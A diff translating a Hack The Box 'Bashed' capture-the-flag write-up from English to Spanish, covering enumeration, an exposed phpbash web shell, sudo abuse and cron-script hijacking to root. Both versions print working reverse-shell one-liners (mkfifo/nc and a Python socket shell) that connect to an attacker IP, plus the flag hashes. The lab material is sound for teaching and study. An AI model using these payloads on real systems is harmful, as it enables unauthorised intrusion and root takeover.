@@ -1,25 +1,25 @@
-# Bashed (Easy · Linux)
+# Bashed (Easy Linux)
 
 **Author:** Ph4n3s
-**Date:** 2026-10-21
+**Fecha:** 21/10/2026
 **IP:** 10.129.78.225
-**Difficulty:** Easy / Linux
+**Dificultad:** Easy / Linux
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
 ### 1.1 Ping
 
-First we run a `ping -c 5 10.129.78.225`, which returns the following:
+Primero realizamos un `ping -c 5 10.129.78.225`, obteniendo lo siguiente:
 
 ```
 64 bytes from 10.129.78.225: icmp_seq=1 ttl=63 time=49.3 ms
 ```
 
-With a TTL of 63 (close to 64) we can infer that this is a Linux machine.
+Con un TTL de 63 (cercano a 64) deducimos que se trata de una máquina Linux.
 
-### 1.2 Open port enumeration
+### 1.2 Enumeración de puertos abiertos
 
 ```
 nmap -p- --open -T4 --min-rate 5000 -oN ~/HTB_machines/Bashed/ports 10.129.78.225
@@ -30,9 +30,9 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-The only open port is 80, a web service.
+El único puerto abierto es el 80, un servicio web.
 
-### 1.3 Technology enumeration
+### 1.3 Enumeración de tecnología
 
 ```
 nmap -p 80 -sVC --min-rate 5000 -T4 -oN ~/HTB_machines/Bashed/targeted 10.129.78.225
@@ -45,19 +45,19 @@ PORT   STATE SERVICE VERSION
 |_http-title: Arrexel's Development Site
 ```
 
-Apache 2.4.18 is a 2015 release, so it might carry some known vulnerability. We visit the site to see what it is about:
+Apache 2.4.18 es una versión de 2015, por lo que podría tener alguna vulnerabilidad conocida. Visitamos la web para ver de qué trata:
 
-![Home page: Arrexel's Development Site, with a post about "phpbash"](bashed-pagina-web.png)
+![Página principal: Arrexel's Development Site, con un post sobre "phpbash"](bashed-pagina-web.png)
 
-It is "Arrexel's" personal blog. The first post, titled **phpbash**, is an important hint: phpbash is a single-line PHP pseudo-shell meant for pentesting, and the post itself says the author developed it *"on this very server"* — meaning it is probably hosted in some directory of this website.
+Es el blog personal de "Arrexel". El primer post que aparece, titulado **phpbash**, es una pista importante: phpbash es una pseudo-shell en PHP de una sola línea pensada para pentesting, y el propio post dice que la desarrolló *"en este mismo servidor"* — es decir, probablemente esté alojada en algún directorio de esta web.
 
-We also run a `curl -I -v http://10.129.78.225:80/` to inspect the headers, but get nothing relevant beyond the standard HTTP/1.1 request.
+Hacemos también un `curl -I -v http://10.129.78.225:80/` para revisar la cabecera, pero no obtenemos nada relevante más allá de la petición HTTP/1.1 estándar.
 
-### 1.4 Searching for known exploits
+### 1.4 Búsqueda de exploits conocidos
 
-With `searchsploit apache 2.4` we find nothing applicable to this specific version (the results are for 2.4.23 and 2.4.49, different versions), so we drop this path.
+Con `searchsploit apache 2.4` no encontramos nada aplicable a esta versión concreta (los resultados son para 2.4.23 y 2.4.49, versiones distintas), así que descartamos esta vía.
 
-### 1.5 nmap vuln script
+### 1.5 Script vuln de nmap
 
 ```
 nmap -p 80 -T4 --min-rate 5000 --script vuln -oN ~/HTB_machines/Bashed/vulns 10.129.78.225
@@ -84,13 +84,13 @@ PORT   STATE SERVICE
 |_  /uploads/: Potentially interesting folder
 ```
 
-Here `/dev/` already shows up as an interesting directory, which fits the hint from the blog post. We discard Slowloris (it is a DoS and we do not want to take the machine down).
+Aquí ya aparece `/dev/` como directorio interesante, lo que encaja con la pista del post del blog. El Slowloris lo descartamos (es un DoS y no queremos tumbar la máquina).
 
 ---
 
 ## 2. Fuzzing
 
-We confirm the content with a basic wordlist:
+Confirmamos el contenido con un diccionario básico:
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.78.225:80/FUZZ -mc 200,204,301,302,307,401,403 -t 100
@@ -107,25 +107,25 @@ server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration:
 uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 61ms]
 ```
 
-Browsing to `http://10.129.78.225/dev/` we find `phpbash.php`, the tool mentioned in the blog, already deployed and accessible without authentication. It is a web pseudo-shell that runs commands with the privileges of the server user (`www-data`):
+Al entrar en `http://10.129.78.225/dev/` encontramos `phpbash.php`, la herramienta mencionada en el blog, ya desplegada y accesible sin autenticación. Es una pseudo-shell web que ejecuta comandos con los permisos del usuario del servidor (`www-data`):
 
-![Shell via phpbash.php: browsing to /home/arrexel and reading user.txt](bashed-phpbash-user-flag.png)
+![Shell vía phpbash.php: navegación hasta /home/arrexel y lectura de user.txt](bashed-phpbash-user-flag.png)
 
-Navigating with it we reach `/home/arrexel/user.txt`:
+Navegando con ella llegamos a `/home/arrexel/user.txt`:
 
 ```
 FLAG arrexel -> d31b69773ae699b8a8989cd92bf934a5
 ```
 
-The first flag is obtained without exploiting anything else: the developer themselves left `/dev/` exposed with their own testing tool.
+La primera flag se obtiene sin necesidad de explotar nada más: el propio desarrollador dejó `/dev/` expuesto con su herramienta de pruebas.
 
 ---
 
-## 3. Privilege escalation
+## 3. Escalada de privilegios
 
-Since we already have command execution via `phpbash`, there is no need to exploit anything additional; we go straight to escalating privileges.
+Como ya tenemos ejecución de comandos vía `phpbash`, no hace falta explotar nada adicional; nos centramos directamente en escalar privilegios.
 
-### 3.1 First attempt
+### 3.1 Primer intento
 
 ```
 sudo -l
@@ -136,47 +136,47 @@ User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-`www-data` can run any command as `scriptmanager` without a password. The direct attempt:
+`www-data` puede ejecutar cualquier comando como `scriptmanager` sin contraseña. El intento directo:
 
 ```
 sudo -u scriptmanager bash -i
 ```
 
-fails with:
+falla con:
 
 ```
 bash: cannot set terminal process group (869): Inappropriate ioctl for device
 bash: no job control in this shell
 ```
 
-This error (`ioctl`) happens because the `phpbash` pseudo-shell is not a real TTY, so an interactive bash cannot properly manage the terminal input/output. The fix is to open a real reverse shell.
+Este error (`ioctl`) ocurre porque la pseudo-shell de `phpbash` no es una TTY real, así que una bash interactiva no puede gestionar correctamente la entrada/salida del terminal. La solución es abrir una reverse shell de verdad.
 
-### 3.2 Reverse shell as scriptmanager
+### 3.2 Reverse shell como scriptmanager
 
-With a listener (`nc -lvnp 4444`) on our machine, we launch from `phpbash`:
+Con un listener (`nc -lvnp 4444`) en nuestra máquina, lanzamos desde `phpbash`:
 
 ```
 sudo -u scriptmanager bash -c 'rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.120 4444 > /tmp/f &)'
 ```
 
-This creates a named pipe (`mkfifo`) that connects the input and output of an interactive shell to our `nc` connection, giving us a fully functional shell as `scriptmanager`.
+Esto crea un pipe con nombre (`mkfifo`) que conecta la entrada y salida de una shell interactiva con nuestra conexión `nc`, consiguiendo así una shell totalmente funcional como `scriptmanager`.
 
-### 3.3 Final escalation to root
+### 3.3 Escalada final a root
 
-Now as `scriptmanager`, `su -l` asks for a password we do not know. Reviewing the system we find the `/scripts` folder, with write permissions over:
+Ya como `scriptmanager`, `su -l` pide una contraseña que no conocemos. Revisando el sistema encontramos la carpeta `/scripts`, con permisos de escritura sobre:
 
 ```
 test.py
 test.txt
 ```
 
-This, together with the fact that they are executed periodically (probably by a cron job as root, judging by the folder name), lets us overwrite `test.py` with a Python reverse shell (standard GTFOBins payload):
+Esto, junto con el hecho de que son ejecutados periódicamente (probablemente por una tarea cron como root, a juzgar por el nombre de la carpeta), nos permite sobrescribir `test.py` con una reverse shell en Python (payload estándar de GTFOBins):
 
 ```python
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.120",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")' > /scripts/test.py
 ```
 
-We open a second listener on port 4445 and wait for the cron to run the script. Shortly after, we receive a shell as **root**, and browse to `/root/root.txt`:
+Abrimos un segundo listener en el puerto 4445 y esperamos a que el cron ejecute el script. Al poco tiempo recibimos una shell como **root**, con la que navegamos a `/root/root.txt`:
 
 ```
 Flag root -> ccf156f4bdeb07a6ee1c61cc8561adcf
@@ -184,17 +184,17 @@ Flag root -> ccf156f4bdeb07a6ee1c61cc8561adcf
 
 ---
 
-## Quick summary
+## Resumen rápido
 
-**What the machine was:** an Apache server hosting "Arrexel's" development blog, which (unknowingly) left a PHP pseudo-shell (`phpbash`) publicly exposed in `/dev/`, originally used for the author's own testing.
+**Qué era la máquina:** un servidor Apache con el blog de desarrollo de "Arrexel", que dejó expuesta públicamente (y sin darse cuenta) una pseudo-shell PHP (`phpbash`) en `/dev/`, usada originalmente para sus propias pruebas.
 
-**Enumeration:** `nmap` → only port 80 → the blog itself mentions the `phpbash` tool → `nmap --script vuln` and `ffuf` confirm `/dev/` as an exposed directory.
+**Enumeración:** `nmap` → solo puerto 80 → el propio blog menciona la herramienta `phpbash` → `nmap --script vuln` y `ffuf` confirman `/dev/` como directorio expuesto.
 
-**Initial access:** `phpbash.php` gives direct command execution as `www-data`, with no need to exploit anything — it was a deployment mistake, not a code vulnerability.
+**Acceso inicial:** `phpbash.php` da ejecución de comandos directa como `www-data`, sin necesidad de explotar nada — fue un error de despliegue, no una vulnerabilidad de código.
 
-**Privilege escalation:** `sudo -l` → `www-data` can run any command as `scriptmanager` without a password → an interactive bash fails due to the lack of a real TTY → solved with a reverse shell via `mkfifo` + `nc` → as `scriptmanager`, we abuse write permissions over a script in `/scripts/` run periodically by a cron job as root → overwrite it with a Python reverse shell payload → shell as root.
+**Escalada de privilegios:** `sudo -l` → `www-data` puede ejecutar cualquier comando como `scriptmanager` sin contraseña → una bash interactiva falla por falta de TTY real → se soluciona con una reverse shell por `mkfifo` + `nc` → como `scriptmanager`, se abusa de permisos de escritura sobre un script en `/scripts/` ejecutado periódicamente por un cron como root → se sobrescribe con un payload de reverse shell en Python → shell como root.
 
-**Key concept learned:** not every privilege escalation relies on a technical exploit — here the key was a bad deployment of the author's own pentesting tool (phpbash) and a cron job with misconfigured write permissions. Also, the `ioctl` error caused by the lack of a TTY is something you have to recognize and solve with a pipe (`mkfifo`) instead of assuming the machine is "broken".
+**Concepto clave aprendido:** no toda escalada de privilegios depende de un exploit técnico — aquí la clave fue un mal despliegue de una herramienta de pentesting propia (phpbash) y un cron job con permisos de escritura mal configurados. Además, el error `ioctl` por falta de TTY es algo que hay que saber reconocer y resolver con un pipe (`mkfifo`) en lugar de asumir que la máquina está "rota".
 
 ---
 
